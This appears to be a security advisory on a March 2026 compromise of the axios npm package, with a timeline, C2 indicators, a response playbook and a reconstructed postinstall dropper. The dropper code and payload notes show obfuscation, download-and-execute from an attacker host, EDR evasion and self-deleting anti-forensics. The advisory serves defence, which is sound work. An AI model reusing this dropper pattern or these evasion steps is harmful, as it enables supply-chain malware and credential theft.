Executive Overview

🚨
Immediate Action — Active Threat as of March 31, 2026

If your environment installed axios@1.14.1 or axios@0.30.4 at any point — including inside Docker builds, CI pipelines, or developer workstations — treat the host as fully compromised. Isolate and rotate all secrets immediately. Downgrade to axios@1.14.0 or axios@0.30.3.

In the early hours of March 31, 2026, an unknown threat actor compromised the npm account of jasonsaayman — the lead maintainer of axios, the most ubiquitous HTTP client library in the JavaScript ecosystem. Used in virtually every Node.js project, browser application, CI/CD runner, and cloud function, axios is present in an estimated 80% of cloud and code environments globally.

The attacker changed the account's registered email to an attacker-controlled ProtonMail address and published two trojanized releases. Rather than modifying axios source code directly, they injected a hidden dependency — plain-crypto-js@4.2.1 — that executes a backdoor dropper via npm's postinstall hook. The dropper is a cross-platform RAT delivering platform-specific second-stage payloads to macOS, Windows, and Linux within seconds of package installation.

🎯

Primary Targets

Developer workstations, CI/CD build runners, container images with Node.js, cloud functions, and any service using axios for HTTP requests — all of which routinely hold SSH keys, cloud credentials, and API tokens.

🤖

What the RAT Does

System fingerprinting, 60-second C2 beaconing, arbitrary binary deployment (peinject), shell/script execution, filesystem enumeration, and process termination. Full remote control of compromised hosts.

🏛️

GovCon / GCC Risk

Node.js-based services, Lambda/Azure Functions, and developer environments with access to GCC tenant credentials, Azure Gov tokens, or CAC-adjacent API keys are at elevated risk. CI runners may have had elevated cloud privileges.

🧹

Anti-Forensics Built In

The dropper self-destructs after execution — deleting setup.js and restoring a clean package.json. The only persistent artifact is node_modules/plain-crypto-js/ itself and the running RAT process.

02

Attack Timeline — Precision Execution

The attacker pre-staged infrastructure and the malicious dependency 18 hours before the attack, then struck within a 39-minute window. Socket's automated scanner detected the malware in 6 minutes — but the RAT had already reached 135+ endpoints in Huntress's partner network alone before removal.

March 30, 2026 — ~06:00 UTC (–18 hrs)

Pre-staging: plain-crypto-js@4.2.0 Published (Clean Decoy)

The attacker (using the email nrwise@proton.me) publishes a clean version of plain-crypto-js@4.2.0 to npm. This establishes the package's existence on the registry and its author's identity before the attack, reducing suspicion when the malicious version appears later.

March 30, 2026 — 23:59:12 UTC

Malicious plain-crypto-js@4.2.1 Published

The backdoored dropper package is published to npm. It contains setup.js — a two-layer obfuscated postinstall script that downloads and executes platform-specific RAT payloads from C2 at sfrclak[.]com:8000.

March 31, 2026 — 00:05:41 UTC (+6 min)

Socket Detects Malware — Automated Alert Fires

Socket's automated supply chain scanner flags plain-crypto-js@4.2.1 as malicious, 6 minutes after publication. However, the malicious axios versions had not yet been published at this point — the C2 infrastructure was already live and waiting.

March 31, 2026 — ~00:21 UTC

axios@1.14.1 Published (tagged "latest")

The attacker, using the compromised jasonsaayman account (email changed to ifstap@proton.me), publishes axios@1.14.1 injecting plain-crypto-js@4.2.1 as a new dependency. Tagged as latest, this immediately becomes the default install for any npm install axios without a pinned version. The exposure window begins.

March 31, 2026 — ~01:00 UTC (+39 min)

axios@0.30.4 Published (tagged "legacy")

A second backdoored version targets legacy users of the older axios v0.x series. This version is tagged legacy, ensuring the attack captures both modern and older installations.

March 31, 2026 — Hours into exposure

135+ Huntress Partner Endpoints Contact C2

John Hammond (Huntress) confirms that within their partner network, at least 135 endpoints across macOS, Windows, and Linux contacted the attacker's C2 infrastructure at sfrclak[.]com:8000 during the active exposure window. Global exposure is significantly higher given axios's 300M+ weekly download volume.

March 31, 2026 — Same day

npm Removes Malicious Versions — Clean Versions Confirmed Safe

npm removes axios@1.14.1, axios@0.30.4, and plain-crypto-js@4.2.1. Advisories GHSA-fw8c-xr5c-95f9 and MAL-2026-2306 published. Safe versions confirmed: axios@1.14.0 and axios@0.30.3. Also published as companion packages: @shadanai/openclaw and @qqbrowser/openclaw-qbot — treat as malicious.

Technical Deep Dive — The Dropper & RAT

The Dependency Injection Technique

The attack exploited the trust relationship between a well-known package and its dependency tree. The axios source code was not directly modified in any meaningful way — instead, a single new entry was added to package.json: a dependency on plain-crypto-js@4.2.1. Because npm install resolves and installs all dependencies automatically, every axios installation silently pulled down the malicious package.

⚡
2-Second Detonation Time

Within two seconds of npm install completing, the malware was already calling home to the attacker's C2 server — before npm had even finished resolving the full dependency tree.

JavaScript — Dropper Logic (Reconstructed) setup.js — postinstall hook payload skeleton 
// plain-crypto-js/setup.js — executes via npm postinstall hook
// Two-layer obfuscation: reversed Base64 (underscore→padding) + XOR key

const os = require('os');
const { execSync, spawn } = require('child_process');

// XOR deobfuscation — key: "OrDeR_7077", constant: 333
function deobfuscate(encoded) {
  const b64 = encoded.split('').reverse().join('').replace(/_/g, '=');
  const buf = Buffer.from(b64, 'base64');
  const key = 'OrDeR_7077';
  return buf.map((b, i) => b ^ key.charCodeAt(i % key.length) ^ 333).toString();
}

// Platform detection → route to correct C2 path + payload
const platform = os.platform();
const C2_BASE  = 'http://sfrclak[.]com:8000/6202033';  // defanged
const paths = { darwin: '/product0', win32: '/product1', linux: '/product2' };

// Download + exec platform-specific second-stage RAT
downloadAndExec(C2_BASE + paths[platform]);

// Anti-forensics: self-destruct dropper artifacts
fs.unlinkSync('setup.js');
fs.unlinkSync('package.json');
fs.renameSync('package.md', 'package.json'); // restore clean version

Platform-Specific Second-Stage Payloads

🍎 macOS
  • AppleScript dropper downloads C++ Mach-O RAT
  • Persists at: /Library/Caches/com.apple.act.mond
  • Fingerprints hostname, user, macOS ver, CPU, boot time, processes
  • 60-second C2 beacon (Base64-encoded data)
  • peinject — deploy arbitrary binaries with code signing
  • runscript — execute shell or AppleScript
  • rundir — enumerate filesystem
  • Process termination capability
🪟 Windows
  • VBScript wrapper → EDR evasion: copies PowerShell to %PROGRAMDATA%\wt.exe
  • Downloads hangup.wav from C2 — XOR-obfuscated EXE inside audio
  • Executes PS1 with -ep bypass -NoProfile
  • Temp artifacts: %TEMP%\6202033.vbs, %TEMP%\6202033.ps1
  • User-Agent: mozilla/4.0 (compatible; msie 8.0; windows nt 5.1)
  • Same C2 beacon / command vocabulary as macOS
🐧 Linux
  • Downloads ringtone.wav from C2 (XOR-obfuscated binary)
  • Python script dropped to /tmp/ld.py
  • Identical C2 protocol and command vocabulary
  • Targets CI/CD runners, containers, cloud VMs
  • High-value on self-hosted GitHub Actions runners (cloud creds, PATs)
  • John Hammond published full Linux payload at GitHub Gist

John Hammond's Key Finding — Huntress

"Developer workstations and CI/CD runners, which routinely hold SSH keys, cloud credentials, and API tokens, are the highest-value targets here. All three platform variants share an identical C2 protocol and command vocabulary — this is a unified, professionally engineered cross-platform RAT, not a quick hack."
— John Hammond, Senior Principal Security Researcher, Huntress

Hammond's analysis confirmed that the macOS, Windows, and Linux payloads share the same C2 beacon structure and command set, indicating a sophisticated, purpose-built cross-platform RAT framework — not an opportunistic script. The attacker appears to have invested significant resources in building infrastructure ahead of the attack. Huntress confirmed 135+ endpoints within their partner network reached out to C2 during the exposure window.

Threat Hunting Queries & Detection

Focus hunting on: npm install logs, network connections to C2, filesystem artifact presence, and suspicious process spawns from Node.js. Don't forget CI/CD build logs — runners that installed axios during the exposure window are critical targets.

Incident Response Playbook — GovCon & GCC

  • Identify All Affected Environments

    Scan all developer workstations, Node.js servers, Docker images, CI/CD runners, Lambda/Azure Function deployment packages, and container registries for axios@1.14.1 or axios@0.30.4. Search package.json, package-lock.json, and yarn.lock files across all repos. Check Docker image layers built on or after March 31, 2026 00:00 UTC.

  • Check for plain-crypto-js Presence

    The definitive indicator: run find / -type d -name "plain-crypto-js" 2>/dev/null. This directory has no legitimate reason to exist in any axios installation. Its presence means the dropper executed — regardless of whether the RAT is still running.

  • Isolate and Preserve

    Take network-isolated snapshots of affected hosts before cleanup. For GovCon environments: preserve forensic evidence per DFARS 252.204-7012 requirements. Collect: running process list, network connections, bash/powershell history, all files under node_modules.

  • Terminate RAT Processes

    Kill: com.apple.act.mond (macOS), wt.exe from ProgramData (Windows), ld.py Python process (Linux). Check for 60-second periodic processes. Block C2 at firewall: sfrclak.com and 142.11.206.73 port 8000.

  • Rotate ALL Secrets on Affected Systems

    Mandatory rotation: LLM API keys, AWS/GCP/Azure credentials, SSH keypairs, GitHub PATs and Actions secrets, npm publish tokens, Kubernetes service account tokens, database passwords, .env values, HashiCorp Vault tokens, and any cloud-provider credentials accessible in the environment at time of compromise.

  • Downgrade axios to Safe Version

    Uninstall and reinstall: npm uninstall axios && npm install axios@1.14.0 or npm install axios@0.30.3. Pin the version in package.json. Remove plain-crypto-js from node_modules and lockfiles. Rebuild affected Docker images from scratch.

  • Audit CI/CD Build History

    Review all GitHub Actions / GitLab CI / Jenkins builds that ran npm install between 2026-03-31 00:00 UTC and npm's package removal. Treat any runner that installed axios during this window as compromised — rotate all secrets that runner had access to.

  • GovCon Reporting Obligations

    If CUI-adjacent systems were affected: assess FISMA/CMMC reporting requirements. Review DFARS 252.204-7012 cyber incident reporting (72-hour DoD notification window). GCC tenants should coordinate with ISSO and review FedRAMP boundary impact documentation.
